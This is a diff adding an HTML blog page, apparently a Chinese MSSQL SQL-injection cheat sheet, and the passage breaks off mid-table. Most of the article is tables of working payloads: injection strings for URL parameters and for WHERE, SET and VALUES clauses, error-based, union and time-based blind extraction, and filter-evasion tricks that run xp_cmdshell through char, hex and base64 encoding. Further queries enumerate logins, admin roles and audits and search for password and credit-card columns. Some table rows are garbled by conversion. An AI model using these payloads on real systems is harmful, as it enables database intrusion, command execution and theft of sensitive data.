@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="m0sway">
+
+
+
+
+
+<title>Mssql注入备忘录 | m0sway&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">m0sway&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">m0sway&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Mssql注入备忘录</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">m0sway</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">二月 18, 2022&nbsp;&nbsp;18:41:12</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/SQli/">SQli</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="DBMS识别"><a href="#DBMS识别" class="headerlink" title="DBMS识别"></a>DBMS识别</h2><table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WAITFOR 函数</td>
+<td>page.asp?id&#x3D;’;WAITFOR DELAY ‘00:00:10’; –</td>
+</tr>
+<tr>
+<td>默认变量</td>
+<td>page.asp?id&#x3D;sql’; SELECT @@SERVERNAME –</td>
+</tr>
+<tr>
+<td>错误消息 注意：通过无效语法触发数据库错误 有时会返回包含DBMS名称的详细错误消息。</td>
+<td>page.asp?id&#x3D;’</td>
+</tr>
+<tr>
+<td>错误消息 注意：如果id参数是整数， 则@@ SERVERNAME变量的字符串值可能导致转换错误。</td>
+<td>page.asp?id&#x3D;@@SERVERNAME</td>
+</tr>
+<tr>
+<td>错误消息 注意：如果id参数是整数， 则@@ SERVERNAME变量的字符串值可能导致转换错误。</td>
+<td>page.asp?id&#x3D;0&#x2F;@@SERVERNAME</td>
+</tr>
+</tbody></table>
+<h3 id="一般提示"><a href="#一般提示" class="headerlink" title="一般提示"></a>一般提示</h3><p>基于ASP &#x2F; ASPX的应用程序一般都是MSSQL。</p>
+<h3 id="将查询转换为注入"><a href="#将查询转换为注入" class="headerlink" title="将查询转换为注入"></a>将查询转换为注入</h3><table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>联合查询</td>
+<td>product.asp?id&#x3D;’ UNION SELECT @@version –</td>
+</tr>
+<tr>
+<td>联合子查询</td>
+<td>product.asp?id&#x3D;’ UNION (SELECT @@version) –</td>
+</tr>
+<tr>
+<td>联合null 注意：如果原始查询返回多个列， 则添加null以等于列数</td>
+<td>product.asp?id&#x3D;’ UNION (SELECT @@version,null) –</td>
+</tr>
+<tr>
+<td>堆积式查询 注意：堆积式查询并不总是返回结果， 因此它们最适合用于更新&#x2F;修改数据的注入。</td>
+<td>product.asp?id&#x3D;’; SELECT @@version –</td>
+</tr>
+</tbody></table>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="基于错误"><a href="#基于错误" class="headerlink" title="基于错误"></a>基于错误</h3><p>当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。错误消息可用于返回完整的查询结果，或获取有关如何重构查询以供进一步利用的信息。</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>显式转换</td>
+<td>SELECT convert(int,(SELECT @@version)) SELECT cast((SELECT @@version) as int)</td>
+</tr>
+<tr>
+<td>隐式转换</td>
+<td>SELECT 1&#x2F;@@version</td>
+</tr>
+</tbody></table>
+<p>以下任何查询都可以使用该convert函数重写或作为隐式转换.</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>将CAST函数注入当前查询</td>
+<td>SELECT CAST(@@version as int)</td>
+</tr>
+<tr>
+<td>显示系统用户</td>
+<td>SELECT CAST(SYSTEM_USER as int);</td>
+</tr>
+<tr>
+<td>用xml路径在一行中显示所有数据库</td>
+<td>SELECT CAST((SELECT name,’,’ FROM master..sysdatabases FOR XML path(‘’)) as int) SELECT CAST((SELECT name AS “data()” FROM master..sysdatabases FOR xml path(‘’)) AS int);</td>
+</tr>
+<tr>
+<td>显示服务器名称</td>
+<td>SELECT CAST(@@SERVERNAME as int);</td>
+</tr>
+<tr>
+<td>显示服务名称</td>
+<td>SELECT CAST(@@SERVICENAME as int);</td>
+</tr>
+<tr>
+<td>显示数据库列表 注意：下面的查询必须在一行中执行。</td>
+<td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr &#x3D; ‘’;SELECT @listStr &#x3D; @listStr + Name + ‘,’ FROM master..sysdatabases;SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</td>
+</tr>
+<tr>
+<td>显示表列表 注意：下面的查询必须在一行中执行</td>
+<td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr &#x3D; ‘’;SELECT @listStr &#x3D; @listStr + Name + ‘,’ FROM MYDATABASE..sysobjects WHERE type &#x3D; ‘U’;SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</td>
+</tr>
+<tr>
+<td>显示列列表 注意：下面的查询必须在一行中执行。</td>
+<td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr &#x3D; ‘’;SELECT @listStr &#x3D; @listStr + Name + ‘,’ FROM MYDATABASE..syscolumns WHERE id&#x3D;object_id(‘MYTABLE’);SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);</td>
+</tr>
+<tr>
+<td>显示列数据 注意：下面的查询必须在一行中执行。 用*替换MYCOLUMN来选择所有列</td>
+<td>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr &#x3D; ‘’;SELECT @listStr &#x3D; @listStr + MYCOLUMN + ‘,’ FROM MYDATABASE..MYTABLE;SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1)SELECT CAST(@myoutput as int);</td>
+</tr>
+<tr>
+<td>一次显示一个数据库名称 注意：递增内部TOP值以获取下一条记录</td>
+<td>SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC</td>
+</tr>
+</tbody></table>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>基于联合的SQL注入允许攻击者通过扩展原始查询返回的结果来从数据库中提取信息。 仅当原始&#x2F;新查询具有相同结构（列的数量和数据类型）时，才能使用联合运算符。</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>联合</td>
+<td>SELECT user UNION SELECT @@version</td>
+</tr>
+<tr>
+<td>联合子查询</td>
+<td>SELECT user UNION (SELECT @@version)</td>
+</tr>
+<tr>
+<td>联合null 注意：如果原始查询返回多个列，则添加null以等于列数</td>
+<td>SELECT user,system_user UNION (SELECT @@version,null)</td>
+</tr>
+<tr>
+<td>联合null二进制减半 注意：此查询用于检测列数。[numberOfColumns]大于列数则返回错误，从而找到表中列的数目。</td>
+<td>SELECT * FROM yourtable ORDER BY [numberOfColumns]</td>
+</tr>
+<tr>
+<td>堆积式查询 注意：堆积式查询并不总是返回结果，因此它们最适合用于更新&#x2F;修改数据的注入。</td>
+<td>SELECT @@version; SELECT @@version –</td>
+</tr>
+</tbody></table>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是更高级的注入方法之一。部分盲和全盲方法详述如下。执行这些查询时要小心，因为如果通过大量自动化执行，它们可能会使服务器过载。</p>
+<h4 id="部分盲"><a href="#部分盲" class="headerlink" title="部分盲"></a>部分盲</h4><p>部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>版本是12.0.2000.8</td>
+<td>SELECT @@version WHERE @@version LIKE ‘%12.0.2000.8%’</td>
+</tr>
+<tr>
+<td>子选择启用</td>
+<td>SELECT (SELECT @@version)</td>
+</tr>
+<tr>
+<td>表log_table存在</td>
+<td>SELECT * FROM log_table</td>
+</tr>
+<tr>
+<td>列message存在于表log_table中</td>
+<td>SELECT message from log_table</td>
+</tr>
+<tr>
+<td>第一条message的第一个字母是t</td>
+<td>WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row &#x3D; 1 and message like ‘t%’</td>
+</tr>
+</tbody></table>
+<h4 id="将部分盲查询转换为全盲查询"><a href="#将部分盲查询转换为全盲查询" class="headerlink" title="将部分盲查询转换为全盲查询"></a>将部分盲查询转换为全盲查询</h4><p>通过使用以下转换，可以在全盲方案中使用上述任何查询：<br>IF exists(<em>PARTIAL_BLIND_QUERY</em>) WAITFOR DELAY ‘00:00:02’</p>
+<h4 id="全盲"><a href="#全盲" class="headerlink" title="全盲"></a>全盲</h4><p>全盲查询不会在HTTP &#x2F; HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他out-of-band 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Version is 12.0.2000.8</td>
+<td>IF exists(SELECT @@version where @@version like ‘%12.0.2000.8%’) WAITFOR DELAY ‘00:00:02’</td>
+</tr>
+</tbody></table>
+<h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Case</td>
+<td>SELECT CASE WHEN 1&#x3D;1 THEN 1 ELSE 0 END</td>
+</tr>
+<tr>
+<td>If&#x2F;Else</td>
+<td>IF 1&#x3D;2 SELECT ‘true’ ELSE SELECT ‘false’;</td>
+</tr>
+</tbody></table>
+<h3 id="注入定位"><a href="#注入定位" class="headerlink" title="注入定位"></a>注入定位</h3><table>
+<thead>
+<tr>
+<th><strong>注入位置</strong></th>
+<th><strong>语句</strong></th>
+<th><strong>注入字符串</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SELECT -&gt; WHERE</td>
+<td>SELECT * FROM USERS WHERE “USER”&#x3D;’$injection’;</td>
+<td>‘ or 1&#x3D;1 –</td>
+</tr>
+<tr>
+<td>UPDATE -&gt; SET</td>
+<td>UPDATE USERS SET “email”&#x3D;’$injection’ WHERE “USER”&#x3D;’NetSPI’;</td>
+<td>‘+’<a href="mailto:harold@netspi.com">harold@netspi.com</a></td>
+</tr>
+<tr>
+<td>‘+’</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>UPDATE -&gt; WHERE 注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td>
+<td>UPDATE USERS SET “email”&#x3D;’<a href="mailto:harold@netspi.com">harold@netspi.com</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>‘ WHERE “USER”&#x3D;’$injection’; | ‘+’NetSPI’+’ |<br>| DELETE -&gt; WHERE | DELETE USERS WHERE “User”&#x3D;’$injection’; | ‘+’NetSPI’+’ |<br>| INSERT -&gt; VALUES | INSERT INTO USERS ([User], [Password]) VALUES (‘$injection’, ‘password’); | ‘+(select @@version)+’ |</p>
+<h3 id="注入混淆"><a href="#注入混淆" class="headerlink" title="注入混淆"></a>注入混淆</h3><table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ASCII&gt;字符</td>
+<td>SELECT char（65）</td>
+</tr>
+<tr>
+<td>字符&gt; ASCII</td>
+<td>SELECT ascii（’A’）</td>
+</tr>
+<tr>
+<td>Hex&gt; Int</td>
+<td>SELECT 0x20 + 0x40</td>
+</tr>
+<tr>
+<td>按位AND</td>
+<td>SELECT 6 &amp; 2</td>
+</tr>
+<tr>
+<td>按位或</td>
+<td>SELECT 6</td>
+</tr>
+<tr>
+<td>按位否定</td>
+<td>SELECT ~6</td>
+</tr>
+<tr>
+<td>按位XOR</td>
+<td>SELECT 6 ^ 2</td>
+</tr>
+<tr>
+<td>字符串截取</td>
+<td>SELECT substring(‘abcd’, 3, 2) substring(string, index, length)</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT cast(‘1’ AS unsigned integer) SELECT cast(‘123’ AS char)</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT concat(‘net’,’spi’)</td>
+</tr>
+<tr>
+<td>注释</td>
+<td>SELECT 1 –comment SELECT&#x2F;<em>comment</em>&#x2F;1</td>
+</tr>
+<tr>
+<td>避免引号</td>
+<td>SELECT char(65)+char(66) – returns AB</td>
+</tr>
+<tr>
+<td>使用％0d避免使用分号</td>
+<td>%0dwaitfor+delay+’0:0:10’–</td>
+</tr>
+<tr>
+<td>Bypass Filtering</td>
+<td>EXEC xP_cMdsheLL ‘dir’;</td>
+</tr>
+<tr>
+<td>用注释避免空格</td>
+<td>EXEC&#x2F;<strong>&#x2F;xp_cmdshell&#x2F;</strong>&#x2F;‘dir’;– ‘;ex&#x2F;<strong>&#x2F;ec xp_cmds&#x2F;</strong>&#x2F;hell ‘dir’;</td>
+</tr>
+<tr>
+<td>用连接避免查询检测</td>
+<td>DECLARE @cmd as varchar(3000); SET @cmd &#x3D; ‘x’+’p’+’_’+’c’+’m’+’d’+’s’+’h’+’e’+’l’+’l’+’&#x2F;**&#x2F;‘+””+’d’+’i’+’r’+””; exec(@cmd);</td>
+</tr>
+<tr>
+<td>用字符编码避免查询检测</td>
+<td>DECLARE @cmd as varchar(3000); SET @cmd &#x3D;(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+ CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116) +CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+ CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+ CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+ CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59)); EXEC(@cmd);</td>
+</tr>
+<tr>
+<td>用base64编码避免查询检测</td>
+<td>DECLARE @data varchar(max), @XmlData xml;SET @data &#x3D; ‘ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn’; SET @XmlData &#x3D; CAST(‘’ + @data + ‘’ as xml);SET @data &#x3D; CONVERT(varchar(max), @XmlData.value(‘(data)[1]’, ‘varbinary(max)’)); exec (@data);</td>
+</tr>
+<tr>
+<td>用Nchar编码避免查询检测</td>
+<td>DECLARE @cmd as nvarchar(3000); SET @cmd &#x3D;(nchar(101)+nchar(120)+nchar(101)+nchar(99)+ nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+ nchar(101)+nchar(114)+nchar(46)+nchar(46)+ nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109) +nchar(100)+nchar(115)+nchar(104)+ nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100) +nchar(105)+nchar(114)+nchar(39)+nchar(59)); EXEC(@cmd);</td>
+</tr>
+<tr>
+<td>用ASCII + CAST 编码避免查询检测</td>
+<td>DECLARE @cmd as varchar(MAX); SET @cmd &#x3D; cast(0x78705F636D647368656C6C202764697227 as varchar(MAX)); exec(@cmd);</td>
+</tr>
+<tr>
+<td>用ASCII + CONVERT 编码避免查询检测</td>
+<td>DECLARE @cmd as varchar(MAX); SET @cmd &#x3D; convert(varchar(MAX),0x78705F636D647368656C6C202764697227); exec(@cmd);</td>
+</tr>
+<tr>
+<td>用varbinary(MAX) 避免查询检测</td>
+<td>DECLARE @cmd as varchar(MAX); SET @cmd &#x3D; convert(varchar(0),0x78705F636D647368656C6C202764697227); exec(@cmd);</td>
+</tr>
+<tr>
+<td>用 sp_sqlexec 避免 EXEC()</td>
+<td>DECLARE @cmd as varchar(3000); SET @cmd &#x3D; convert(varchar(0),0×78705F636D647368656C6C202764697227); exec sp_sqlexec @cmd;</td>
+</tr>
+<tr>
+<td>执行 xp_cmdshell ‘dir’</td>
+<td>DECLARE @tmp as varchar(MAX); SET @tmp &#x3D; char(88)+char(80)+char(95)+char(67)+char(77)+ char(68)+char(83)+char(72)+char(69)+char(76)+char(76); exec @tmp ‘dir’;</td>
+</tr>
+</tbody></table>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>收集有关任何测试环境的信息通常很有价值; 版本号，用户帐户和数据库都有助于升级漏洞。以下是常见的方法。<br>*需要特权用户</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>版本</td>
+<td>SELECT @@version;</td>
+</tr>
+<tr>
+<td>单个用户</td>
+<td>SELECT user; SELECT system_user; SELECT user_name(); SELECT loginame from master..sysprocesses where spid &#x3D; @@SPID</td>
+</tr>
+<tr>
+<td>所有用户</td>
+<td>SELECT name from master..syslogins</td>
+</tr>
+<tr>
+<td>表</td>
+<td>SELECT table_catalog, table_name FROM information_schema.columns</td>
+</tr>
+<tr>
+<td>列</td>
+<td>SELECT table_catalog, column_name FROM information_schema.columns</td>
+</tr>
+<tr>
+<td>所有数据库</td>
+<td>SELECT name from master..sysdatabases;</td>
+</tr>
+<tr>
+<td>当前数据库</td>
+<td>SELECT db_name();</td>
+</tr>
+<tr>
+<td>服务器名称</td>
+<td>SELECT @@SERVERNAME</td>
+</tr>
+<tr>
+<td>查找存储过程</td>
+<td>SELECT * from master..sysobjects where name like ‘sp%’ order by name desc</td>
+</tr>
+<tr>
+<td>通过用户名获取SUID</td>
+<td>SELECT SUSER_ID(‘sa’)</td>
+</tr>
+<tr>
+<td>通过SUID获取用户名</td>
+<td>SELECT SUSER_NAME(1)</td>
+</tr>
+<tr>
+<td>检查账户是不是管理员</td>
+<td>IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E)) SELECT is_srvrolemember(‘sysadmin’);</td>
+</tr>
+<tr>
+<td>Policies</td>
+<td>SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id &#x3D; c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id &#x3D; p.object_set_id</td>
+</tr>
+<tr>
+<td>域用户</td>
+<td><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td>
+</tr>
+<tr>
+<td>DB 审计</td>
+<td>SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid &#x3D; s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id &#x3D; d.database_specification_id</td>
+</tr>
+<tr>
+<td>Server 审计</td>
+<td>SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid &#x3D; s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id &#x3D; d.server_specification_id</td>
+</tr>
+<tr>
+<td>查询历史记录</td>
+<td>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),’Ad-Hoc’) AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset &#x2F; 2+1,( (CASE WHEN statement_end_offset &#x3D; -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2) ELSE statement_end_offset END)- statement_start_offset) &#x2F; 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC</td>
+</tr>
+</tbody></table>
+<h3 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h3><p>能够正确地识别和定位敏感信息可以以指数的方式减少在数据库中花费的时间，这意味着可以花费更多的时间在其他方向上。</p>
+<table>
+<thead>
+<tr>
+<th><strong>描述</strong></th>
+<th><strong>语句</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>列出非默认数据库</td>
+<td>SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE ‘distribution’) AND (NAME NOT LIKE ‘master’) AND (NAME NOT LIKE ‘model’) AND (NAME NOT LIKE ‘msdb’) AND (NAME NOT LIKE ‘publication’) AND (NAME NOT LIKE ‘reportserver’) AND (NAME NOT LIKE ‘reportservertempdb’) AND (NAME NOT LIKE ‘resource’) AND (NAME NOT LIKE ‘tempdb’) ORDER BY NAME;</td>
+</tr>
+<tr>
+<td>列出非默认表</td>
+<td>SELECT ‘[‘ + SCHEMA_NAME(t.schema_id) + ‘].[‘ + t.name + ‘]’ AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id &#x3D; i.id AND i.indid &lt; 2 WHERE (ROWS&gt; 0) AND (t.name NOT LIKE ‘syscolumns’) AND (t.name NOT LIKE ‘syscomments’) AND (t.name NOT LIKE ‘sysconstraints’) AND (t.name NOT LIKE ‘sysdepends’) AND (t.name NOT LIKE ‘sysfilegroups’) AND (t.name NOT LIKE ‘sysfiles’) AND (t.name NOT LIKE ‘sysforeignkeys’) AND (t.name NOT LIKE ‘sysfulltextcatalogs’) AND (t.name NOT LIKE ‘sysindexes’) AND (t.name NOT LIKE ‘sysindexkeys’) AND (t.name NOT LIKE ‘sysmembers’) AND (t.name NOT LIKE ‘sysobjects’) AND (t.name NOT LIKE ‘syspermissions’) AND (t.name NOT LIKE ‘sysprotects’) AND (t.name NOT LIKE ‘sysreferences’) AND (t.name NOT LIKE ‘systypes’) AND (t.name NOT LIKE ‘sysusers’) ORDER BY TABLE_NAME;</td>
+</tr>
+<tr>
+<td>列名搜索</td>
+<td>SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like ‘%password%’</td>
+</tr>
+<tr>
+<td>列出非默认列</td>
+<td>SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH &gt; 14 AND DATA_TYPE NOT IN (‘bigint’,’binary’,’bit’,’cursor’,’date’,’datetime’,’datetime2’, ‘datetimeoffset’,’float’,’geography’,’hierarchyid’,’image’,’int’,’money’,’real’, ‘smalldatetime’,’smallint’,’smallmoney’,’sql_variant’,’table’,’time’,’timestamp’, ‘tinyint’,’uniqueidentifier’,’varbinary’,’xml’) AND TABLE_NAME&#x3D;’CreditCard’ OR CHARACTER_MAXIMUM_LENGTH &lt; 1 AND DATA_TYPE NOT IN ( ‘bigint’, ‘binary’, ‘bit’, ‘cursor’, ‘date’, ‘datetime’, ‘datetime2’, ‘datetimeoffset’, ‘float’, ‘geography’, ‘hierarchyid’, ‘image’, ‘int’, ‘money’, ‘real’, ‘smalldatetime’, ‘smallint’, ‘smallmoney’, ‘sql_variant’, ‘table’, ‘time’, ‘timestamp’, ‘tinyint’, ‘uniqueidentifier’, ‘varbinary’, ‘xml’) AND TABLE_NAME&#x3D;’CreditCard’ ORDER BY COLUMN_NAME;</td>
+</tr>
+<tr>
+<td>搜索透明加密</td>
+<td>SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id &#x3D; b.dbid ORDER BY a.database_id WHERE is_encrypted&#x3D;1</td>
+</tr>
+<tr>
